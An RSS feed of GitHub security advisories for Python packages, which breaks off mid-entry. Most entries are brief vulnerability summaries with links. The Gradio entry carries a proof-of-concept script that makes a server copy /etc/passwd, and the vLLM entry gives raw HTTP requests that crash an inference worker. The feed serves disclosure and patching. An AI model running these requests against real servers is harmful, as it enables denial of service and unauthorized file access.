<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2025-06-04T20:09:17.346Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[django-helpdesk] django-helpdesk Allows Sensitive Data Exposure]]></title>
        <id>https://github.com/advisories/GHSA-m4jx-m5hg-qrxx</id>
        <link href="https://github.com/advisories/GHSA-m4jx-m5hg-qrxx"/>
        <updated>2025-06-04T01:30:26.000Z</updated>
        <content type="html"><![CDATA[<p>django-helpdesk before 1.0.0 allows Sensitive Data Exposure because of os.umask(0) in models.py.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-25111">https://nvd.nist.gov/vuln/detail/CVE-2018-25111</a></li>
<li><a href="https://github.com/django-helpdesk/django-helpdesk/issues/591">https://github.com/django-helpdesk/django-helpdesk/issues/591</a></li>
<li><a href="https://github.com/django-helpdesk/django-helpdesk/pull/1120">https://github.com/django-helpdesk/django-helpdesk/pull/1120</a></li>
<li><a href="https://github.com/django-helpdesk/django-helpdesk/releases/tag/v1.0.0">https://github.com/django-helpdesk/django-helpdesk/releases/tag/v1.0.0</a></li>
<li><a href="https://github.com/django-helpdesk/django-helpdesk/commit/f872ec252769bee5a88b06d07d3634e580c67bcc">https://github.com/django-helpdesk/django-helpdesk/commit/f872ec252769bee5a88b06d07d3634e580c67bcc</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django-helpdesk/PYSEC-2025-44.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django-helpdesk/PYSEC-2025-44.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-m4jx-m5hg-qrxx">https://github.com/advisories/GHSA-m4jx-m5hg-qrxx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m4jx-m5hg-qrxx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-31T03:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[torch] PyTorch Improper Resource Shutdown or Release vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-887c-mr87-cxwp</id>
        <link href="https://github.com/advisories/GHSA-887c-mr87-cxwp"/>
        <updated>2025-05-30T17:13:52.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability, which was classified as problematic, was found in PyTorch 2.6.0. Affected is the function torch.nn.functional.ctc_loss of the file aten/src/ATen/native/LossCTC.cpp. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. The name of the patch is 46fc5d8e360127361211cb237d5f9eef0223e567. It is recommended to apply a patch to fix this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3730">https://nvd.nist.gov/vuln/detail/CVE-2025-3730</a></li>
<li><a href="https://github.com/pytorch/pytorch/issues/150835">https://github.com/pytorch/pytorch/issues/150835</a></li>
<li><a href="https://github.com/pytorch/pytorch/pull/150981">https://github.com/pytorch/pytorch/pull/150981</a></li>
<li><a href="https://vuldb.com/?ctiid.305076">https://vuldb.com/?ctiid.305076</a></li>
<li><a href="https://vuldb.com/?id.305076">https://vuldb.com/?id.305076</a></li>
<li><a href="https://vuldb.com/?submit.553645">https://vuldb.com/?submit.553645</a></li>
<li><a href="https://github.com/pytorch/pytorch/commit/01f226bfb8f2c343f5c614a6bbf685d91160f3af">https://github.com/pytorch/pytorch/commit/01f226bfb8f2c343f5c614a6bbf685d91160f3af</a></li>
<li><a href="https://github.com/timocafe/tewart-pytorch/commit/46fc5d8e360127361211cb237d5f9eef0223e567">https://github.com/timocafe/tewart-pytorch/commit/46fc5d8e360127361211cb237d5f9eef0223e567</a></li>
<li><a href="https://github.com/advisories/GHSA-887c-mr87-cxwp">https://github.com/advisories/GHSA-887c-mr87-cxwp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-887c-mr87-cxwp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-16T21:30:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[torch] PyTorch susceptible to local Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-3749-ghw9-m3mg</id>
        <link href="https://github.com/advisories/GHSA-3749-ghw9-m3mg"/>
        <updated>2025-05-30T17:13:29.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability, which was classified as problematic, has been found in PyTorch 2.6.0+cu124. Affected by this issue is the function torch.mkldnn_max_pool2d. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2953">https://nvd.nist.gov/vuln/detail/CVE-2025-2953</a></li>
<li><a href="https://github.com/pytorch/pytorch/issues/149274">https://github.com/pytorch/pytorch/issues/149274</a></li>
<li><a href="https://github.com/pytorch/pytorch/issues/149274#issue-2923122269">https://github.com/pytorch/pytorch/issues/149274#issue-2923122269</a></li>
<li><a href="https://vuldb.com/?ctiid.302006">https://vuldb.com/?ctiid.302006</a></li>
<li><a href="https://vuldb.com/?id.302006">https://vuldb.com/?id.302006</a></li>
<li><a href="https://vuldb.com/?submit.521279">https://vuldb.com/?submit.521279</a></li>
<li><a href="https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models">https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models</a></li>
<li><a href="https://github.com/advisories/GHSA-3749-ghw9-m3mg">https://github.com/advisories/GHSA-3749-ghw9-m3mg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3749-ghw9-m3mg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-30T18:30:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-superset] Apache Superset: Improper authorization bypass on row level security via SQL Injection]]></title>
        <id>https://github.com/advisories/GHSA-8w7f-8pr9-xgwj</id>
        <link href="https://github.com/advisories/GHSA-8w7f-8pr9-xgwj"/>
        <updated>2025-06-03T01:10:37.000Z</updated>
        <content type="html"><![CDATA[<p>An authenticated malicious actor using specially crafted requests could bypass row level security configuration by injecting SQL into 'sqlExpression' fields. This allowed the execution of sub-queries to evade parsing defenses ultimately granting unauthorized access to data.</p>
<p>This issue affects Apache Superset: before 4.1.2.</p>
<p>Users are recommended to upgrade to version 4.1.2, which fixes the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48912">https://nvd.nist.gov/vuln/detail/CVE-2025-48912</a></li>
<li><a href="https://lists.apache.org/thread/ms2t2oq218hb7l628trsogo4fj7h1135">https://lists.apache.org/thread/ms2t2oq218hb7l628trsogo4fj7h1135</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/05/30/3">http://www.openwall.com/lists/oss-security/2025/05/30/3</a></li>
<li><a href="https://github.com/advisories/GHSA-8w7f-8pr9-xgwj">https://github.com/advisories/GHSA-8w7f-8pr9-xgwj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8w7f-8pr9-xgwj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-05-30T09:30:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ansible] Ansible fails to properly mark lookup-plugin results as unsafe]]></title>
        <id>https://github.com/advisories/GHSA-w578-j992-554x</id>
        <link href="https://github.com/advisories/GHSA-w578-j992-554x"/>
        <updated>2025-05-29T22:47:18.000Z</updated>
        <content type="html"><![CDATA[<p>Ansible before versions 2.1.6.0, 2.2.3.0, 2.3.1.0, and 2.4.0.0 fails to properly mark lookup-plugin results as unsafe. If an attacker could control the results of lookup() calls, they could inject Unicode strings to be parsed by the jinja2 templating system, resulting in code execution. By default, the jinja2 templating language is now marked as 'unsafe' and is not evaluated.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7481">https://nvd.nist.gov/vuln/detail/CVE-2017-7481</a></li>
<li><a href="https://github.com/ansible/ansible/commit/a1886911fcf4b691130cfc70dfc5daa5e07c46a3">https://github.com/ansible/ansible/commit/a1886911fcf4b691130cfc70dfc5daa5e07c46a3</a></li>
<li><a href="https://github.com/ansible/ansible/commit/ed56f51f185a1ffd7ea57130d260098686fcc7c2">https://github.com/ansible/ansible/commit/ed56f51f185a1ffd7ea57130d260098686fcc7c2</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:1244">https://access.redhat.com/errata/RHSA-2017:1244</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:1334">https://access.redhat.com/errata/RHSA-2017:1334</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:1476">https://access.redhat.com/errata/RHSA-2017:1476</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:1499">https://access.redhat.com/errata/RHSA-2017:1499</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:1599">https://access.redhat.com/errata/RHSA-2017:1599</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:2524">https://access.redhat.com/errata/RHSA-2017:2524</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-7481">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-7481</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/ansible/PYSEC-2018-41.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/ansible/PYSEC-2018-41.yaml</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2021/01/msg00023.html">https://lists.debian.org/debian-lts-announce/2021/01/msg00023.html</a></li>
<li><a href="https://usn.ubuntu.com/4072-1">https://usn.ubuntu.com/4072-1</a></li>
<li><a href="https://web.archive.org/web/20170801122609/http://www.securityfocus.com/bid/98492">https://web.archive.org/web/20170801122609/http://www.securityfocus.com/bid/98492</a></li>
<li><a href="https://github.com/ansible/ansible/commit/f0e348f5eeb70c1fb3127d90891da43b5c0a9d29">https://github.com/ansible/ansible/commit/f0e348f5eeb70c1fb3127d90891da43b5c0a9d29</a></li>
<li><a href="https://github.com/ansible/ansible/commit/fd30f5328986f9e1da434474481f32bf918a600c">https://github.com/ansible/ansible/commit/fd30f5328986f9e1da434474481f32bf918a600c</a></li>
<li><a href="https://github.com/advisories/GHSA-w578-j992-554x">https://github.com/advisories/GHSA-w578-j992-554x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w578-j992-554x</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2018-09-06T03:28:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ansible] Ansible fails to properly mark lookup-plugin results as unsafe]]></title>
        <id>https://github.com/advisories/GHSA-w578-j992-554x</id>
        <link href="https://github.com/advisories/GHSA-w578-j992-554x"/>
        <updated>2025-05-29T22:47:18.000Z</updated>
        <content type="html"><![CDATA[<p>Ansible before versions 2.1.6.0, 2.2.3.0, 2.3.1.0, and 2.4.0.0 fails to properly mark lookup-plugin results as unsafe. If an attacker could control the results of lookup() calls, they could inject Unicode strings to be parsed by the jinja2 templating system, resulting in code execution. By default, the jinja2 templating language is now marked as 'unsafe' and is not evaluated.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7481">https://nvd.nist.gov/vuln/detail/CVE-2017-7481</a></li>
<li><a href="https://github.com/ansible/ansible/commit/a1886911fcf4b691130cfc70dfc5daa5e07c46a3">https://github.com/ansible/ansible/commit/a1886911fcf4b691130cfc70dfc5daa5e07c46a3</a></li>
<li><a href="https://github.com/ansible/ansible/commit/ed56f51f185a1ffd7ea57130d260098686fcc7c2">https://github.com/ansible/ansible/commit/ed56f51f185a1ffd7ea57130d260098686fcc7c2</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:1244">https://access.redhat.com/errata/RHSA-2017:1244</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:1334">https://access.redhat.com/errata/RHSA-2017:1334</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:1476">https://access.redhat.com/errata/RHSA-2017:1476</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:1499">https://access.redhat.com/errata/RHSA-2017:1499</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:1599">https://access.redhat.com/errata/RHSA-2017:1599</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:2524">https://access.redhat.com/errata/RHSA-2017:2524</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-7481">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-7481</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/ansible/PYSEC-2018-41.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/ansible/PYSEC-2018-41.yaml</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2021/01/msg00023.html">https://lists.debian.org/debian-lts-announce/2021/01/msg00023.html</a></li>
<li><a href="https://usn.ubuntu.com/4072-1">https://usn.ubuntu.com/4072-1</a></li>
<li><a href="https://web.archive.org/web/20170801122609/http://www.securityfocus.com/bid/98492">https://web.archive.org/web/20170801122609/http://www.securityfocus.com/bid/98492</a></li>
<li><a href="https://github.com/ansible/ansible/commit/f0e348f5eeb70c1fb3127d90891da43b5c0a9d29">https://github.com/ansible/ansible/commit/f0e348f5eeb70c1fb3127d90891da43b5c0a9d29</a></li>
<li><a href="https://github.com/ansible/ansible/commit/fd30f5328986f9e1da434474481f32bf918a600c">https://github.com/ansible/ansible/commit/fd30f5328986f9e1da434474481f32bf918a600c</a></li>
<li><a href="https://github.com/advisories/GHSA-w578-j992-554x">https://github.com/advisories/GHSA-w578-j992-554x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w578-j992-554x</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2018-09-06T03:28:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ansible] Ansible fails to properly mark lookup-plugin results as unsafe]]></title>
        <id>https://github.com/advisories/GHSA-w578-j992-554x</id>
        <link href="https://github.com/advisories/GHSA-w578-j992-554x"/>
        <updated>2025-05-29T22:47:18.000Z</updated>
        <content type="html"><![CDATA[<p>Ansible before versions 2.1.6.0, 2.2.3.0, 2.3.1.0, and 2.4.0.0 fails to properly mark lookup-plugin results as unsafe. If an attacker could control the results of lookup() calls, they could inject Unicode strings to be parsed by the jinja2 templating system, resulting in code execution. By default, the jinja2 templating language is now marked as 'unsafe' and is not evaluated.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7481">https://nvd.nist.gov/vuln/detail/CVE-2017-7481</a></li>
<li><a href="https://github.com/ansible/ansible/commit/a1886911fcf4b691130cfc70dfc5daa5e07c46a3">https://github.com/ansible/ansible/commit/a1886911fcf4b691130cfc70dfc5daa5e07c46a3</a></li>
<li><a href="https://github.com/ansible/ansible/commit/ed56f51f185a1ffd7ea57130d260098686fcc7c2">https://github.com/ansible/ansible/commit/ed56f51f185a1ffd7ea57130d260098686fcc7c2</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:1244">https://access.redhat.com/errata/RHSA-2017:1244</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:1334">https://access.redhat.com/errata/RHSA-2017:1334</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:1476">https://access.redhat.com/errata/RHSA-2017:1476</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:1499">https://access.redhat.com/errata/RHSA-2017:1499</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:1599">https://access.redhat.com/errata/RHSA-2017:1599</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:2524">https://access.redhat.com/errata/RHSA-2017:2524</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-7481">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-7481</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/ansible/PYSEC-2018-41.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/ansible/PYSEC-2018-41.yaml</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2021/01/msg00023.html">https://lists.debian.org/debian-lts-announce/2021/01/msg00023.html</a></li>
<li><a href="https://usn.ubuntu.com/4072-1">https://usn.ubuntu.com/4072-1</a></li>
<li><a href="https://web.archive.org/web/20170801122609/http://www.securityfocus.com/bid/98492">https://web.archive.org/web/20170801122609/http://www.securityfocus.com/bid/98492</a></li>
<li><a href="https://github.com/ansible/ansible/commit/f0e348f5eeb70c1fb3127d90891da43b5c0a9d29">https://github.com/ansible/ansible/commit/f0e348f5eeb70c1fb3127d90891da43b5c0a9d29</a></li>
<li><a href="https://github.com/ansible/ansible/commit/fd30f5328986f9e1da434474481f32bf918a600c">https://github.com/ansible/ansible/commit/fd30f5328986f9e1da434474481f32bf918a600c</a></li>
<li><a href="https://github.com/advisories/GHSA-w578-j992-554x">https://github.com/advisories/GHSA-w578-j992-554x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w578-j992-554x</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2018-09-06T03:28:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gradio] Gradio Allows Unauthorized File Copy via Path Manipulation]]></title>
        <id>https://github.com/advisories/GHSA-8jw3-6x8j-v96g</id>
        <link href="https://github.com/advisories/GHSA-8jw3-6x8j-v96g"/>
        <updated>2025-05-30T15:18:22.000Z</updated>
        <content type="html"><![CDATA[<p>An arbitrary file copy vulnerability in Gradio's flagging feature allows unauthenticated attackers to copy any readable file from the server's filesystem. While attackers can't read these copied files, they can cause DoS by copying large files (like /dev/urandom) to fill disk space.</p>
<h3 id="description">Description</h3>
<p>The flagging component doesn't properly validate file paths before copying files. Attackers can send specially crafted requests to the <code>/gradio_api/run/predict</code> endpoint to trigger these file copies.</p>
<p><strong>Source</strong>: User-controlled <code>path</code> parameter in the flagging functionality JSON payload<br><strong>Sink</strong>: <code>shutil.copy</code> operation in <code>FileData._copy_to_dir()</code> method</p>
<p>The vulnerable code flow:</p>
<ol>
<li>A JSON payload is sent to the <code>/gradio_api/run/predict</code> endpoint</li>
<li>The <code>path</code> field within <code>FileData</code> object can reference any file on the system</li>
<li>When processing this request, the <code>Component.flag()</code> method creates a <code>GradioDataModel</code> object</li>
<li>The <code>FileData._copy_to_dir()</code> method uses this path without proper validation:</li>
</ol>
<pre><code class="language-python">def _copy_to_dir(self, dir: str) -&gt; FileData:
    pathlib.Path(dir).mkdir(exist_ok=True)
    new_obj = dict(self)

    if not self.path:
        raise ValueError("Source file path is not set")
    new_name = shutil.copy(self.path, dir)  # vulnerable sink
    new_obj["path"] = new_name
    return self.__class__(**new_obj)
</code></pre>
<ol start="5">
<li>The lack of validation allows copying any file the Gradio process can read</li>
</ol>
<h3 id="poc">PoC</h3>
<p>The following script demonstrates the vulnerability by copying <code>/etc/passwd</code> from the server to Gradio's flagged directory:</p>
<p>Setup a Gradio app:</p>
<pre><code class="language-python">import gradio as gr

def image_classifier(inp):
    return {'cat': 0.2, 'dog': 0.8}

test = gr.Interface(fn=image_classifier, inputs="image", outputs="label")

test.launch(share=True)
</code></pre>
<p>Run the PoC:</p>
<pre><code class="language-python">import requests

url = "https://[your-gradio-app-url]/gradio_api/run/predict"  
headers = {
    "Content-Type": "application/json",  
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" 
}

payload = {
    "data": [
        {
            "path": "/etc/passwd",  
            "url": "[your-gradio-app-url]",
            "orig_name": "network_config", 
            "size": 5000,  
            "mime_type": "text/plain", 
            "meta": {
                "_type": "gradio.FileData"  
            }
        },
        {}  
    ],
    "event_data": None,
    "fn_index": 4, 
    "trigger_id": 11, 
    "session_hash": "test123"  
}

response = requests.post(url, headers=headers, json=payload)
print(f"Status Code: {response.status_code}")
print(f"Response Body: {response.text}")
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gradio-app/gradio/security/advisories/GHSA-8jw3-6x8j-v96g">https://github.com/gradio-app/gradio/security/advisories/GHSA-8jw3-6x8j-v96g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48889">https://nvd.nist.gov/vuln/detail/CVE-2025-48889</a></li>
<li><a href="https://github.com/advisories/GHSA-8jw3-6x8j-v96g">https://github.com/advisories/GHSA-8jw3-6x8j-v96g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8jw3-6x8j-v96g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-29T22:36:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[multicast] multicast in source builds from vulnerable setuptools dependency]]></title>
        <id>https://github.com/advisories/GHSA-94v7-wxj6-r2q5</id>
        <link href="https://github.com/advisories/GHSA-94v7-wxj6-r2q5"/>
        <updated>2025-05-28T21:07:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<ul>
<li>Some source-builds may be impacted by a CWE-1395 (eg. vulnerable <code>setuptools</code> dependency).<ul>
<li>Multicast prior to v2.0.9a3 on systems with minimal dependancies installed may use <code>setuptools &lt;78.1.1</code> and thus rely on a compromised dependency. In some cases there is a chance that source-builds would fail due to an exploit of the closely related CVE-2025-47273, or become arbitrarily modified.</li>
</ul>
</li>
</ul>
<h3 id="patches">Patches</h3>
<ul>
<li>Pre-release version v2.0.9a0 and later resolve the issue by bumping requirements to <code>setuptools&gt;=80.4</code><ul>
<li>Pre-release version v2.0.9a3 and later are recommended for improved stability over v2.0.9a0</li>
</ul>
</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Further hardening in v2.0.9a4+ of the build process in CI builds allowing source builds to be verified via GH attestations.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pypa/setuptools/security/advisories/GHSA-5rjg-fvgr-3xxf">GHSA-5rjg-fvgr-3xxf</a></li>
<li>pypa/setuptools#4946</li>
</ul>
<h3 id="fixes">Fixes</h3>
<ul>
<li><a href="https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/tests/requirements.txt#L32">https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/tests/requirements.txt#L32</a></li>
<li><a href="https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/docs/requirements.txt#L27">https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/docs/requirements.txt#L27</a></li>
<li><a href="https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/requirements.txt#L26">https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/requirements.txt#L26</a></li>
<li><a href="https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/pyproject.toml#L2">https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/pyproject.toml#L2</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/pypa/setuptools/security/advisories/GHSA-5rjg-fvgr-3xxf">https://github.com/pypa/setuptools/security/advisories/GHSA-5rjg-fvgr-3xxf</a></li>
<li><a href="https://github.com/reactive-firewall/multicast/security/advisories/GHSA-94v7-wxj6-r2q5">https://github.com/reactive-firewall/multicast/security/advisories/GHSA-94v7-wxj6-r2q5</a></li>
<li><a href="https://github.com/pypa/setuptools/issues/4946">https://github.com/pypa/setuptools/issues/4946</a></li>
<li><a href="https://github.com/reactive-firewall/multicast/commit/c5c7c7de272421d944beca8452871bca6bfd151f">https://github.com/reactive-firewall/multicast/commit/c5c7c7de272421d944beca8452871bca6bfd151f</a></li>
<li><a href="https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/docs/requirements.txt#L27">https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/docs/requirements.txt#L27</a></li>
<li><a href="https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/pyproject.toml#L2">https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/pyproject.toml#L2</a></li>
<li><a href="https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/requirements.txt#L26">https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/requirements.txt#L26</a></li>
<li><a href="https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/tests/requirements.txt#L32">https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/tests/requirements.txt#L32</a></li>
<li><a href="https://github.com/advisories/GHSA-94v7-wxj6-r2q5">https://github.com/advisories/GHSA-94v7-wxj6-r2q5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-94v7-wxj6-r2q5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-28T21:07:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM Tool Schema allows DoS via Malformed pattern and type Fields]]></title>
        <id>https://github.com/advisories/GHSA-vrq3-r879-7m65</id>
        <link href="https://github.com/advisories/GHSA-vrq3-r879-7m65"/>
        <updated>2025-05-30T21:41:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The vLLM backend used with the /v1/chat/completions OpenAPI endpoint fails to validate unexpected or malformed input in the "pattern" and "type" fields when the tools functionality is invoked. These inputs are not validated before being compiled or parsed, causing a crash of the inference worker with a single request. The worker will remain down until it is restarted. </p>
<h3 id="details">Details</h3>
<p>The "type" field is expected to be one of: "string", "number", "object", "boolean", "array", or "null". Supplying any other value will cause the worker to crash with the following error:</p>
<p>RuntimeError: [11:03:34] /project/cpp/json_schema_converter.cc:637: Unsupported type "something_or_nothing"</p>
<p>The "pattern" field undergoes Jinja2 rendering (I think) prior to being passed unsafely into the native regex compiler without validation or escaping. This allows malformed expressions to reach the underlying C++ regex engine, resulting in fatal errors.</p>
<p>For example, the following inputs will crash the worker:</p>
<p>Unclosed {, [, or (</p>
<p>Closed:{} and []</p>
<p>Here are some of runtime errors on the crash depending on what gets injected:</p>
<p>RuntimeError: [12:05:04] /project/cpp/regex_converter.cc:73: Regex parsing error at position 4: The parenthesis is not closed.
RuntimeError: [10:52:27] /project/cpp/regex_converter.cc:73: Regex parsing error at position 2: Invalid repetition count.
RuntimeError: [12:07:18] /project/cpp/regex_converter.cc:73: Regex parsing error at position 6: Two consecutive repetition modifiers are not allowed.</p>
<h3 id="poc">PoC</h3>
<p>Here is the POST request using the type field to crash the worker. Note the type field is set to "something" rather than the expected types it is looking for:
POST /v1/chat/completions HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: 
Content-Type: application/json
Content-Length: 579
Origin: 
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive</p>
<p>{
  "model": "mistral-nemo-instruct",
  "messages": [{ "role": "user", "content": "crash via type" }],
  "tools": [
    {
      "type": "function",
      "function": {
        "name": "crash01",
        "parameters": {
          "type": "object",
          "properties": {
            "a": {
              "type": "something"
            }
          }
        }
      }
    }
  ],
  "tool_choice": {
    "type": "function",
    "function": {
      "name": "crash01",
      "arguments": { "a": "test" }
    }
  },
  "stream": false,
  "max_tokens": 1
}</p>
<p>Here is the POST request using the pattern field to crash the worker. Note the pattern field is set to a RCE payload, it could have just been set to {{}}. I was not able to get RCE in my testing, but is does crash the worker.</p>
<p>POST /v1/chat/completions HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: 
Content-Type: application/json
Content-Length: 718
Origin: 
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive</p>
<p>{
  "model": "mistral-nemo-instruct",
